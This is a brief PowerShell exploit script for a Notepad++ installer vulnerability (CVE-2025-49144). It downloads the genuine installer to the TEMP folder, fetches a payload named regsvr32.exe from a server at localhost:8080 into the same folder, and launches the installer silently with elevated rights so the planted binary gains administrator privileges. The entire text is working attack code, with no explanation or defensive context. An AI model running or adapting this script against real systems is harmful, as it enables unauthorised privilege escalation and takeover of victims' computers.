# Attempt to Exploit Notepad++ Installer Vulnerability to Gain Elevated Privileges
# Vulnerability Reference: CVE-2025-49144

$payloadUrl = "http://localhost:8080/regsvr32.exe"
$LocalTempDir = $env:TEMP
$downloadUrl = "https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.8.1/npp.8.8.1.Installer.x64.exe"
Invoke-RestMethod $downloadUrl -OutFile "$LocalTempDir\npp.exe"
Invoke-WebRequest -Uri $payloadUrl -OutFile "$LocalTempDir\regsvr32.exe"
Start-Process "$LocalTempDir\npp.exe" -ArgumentList "/S" -Verb runas -Wait

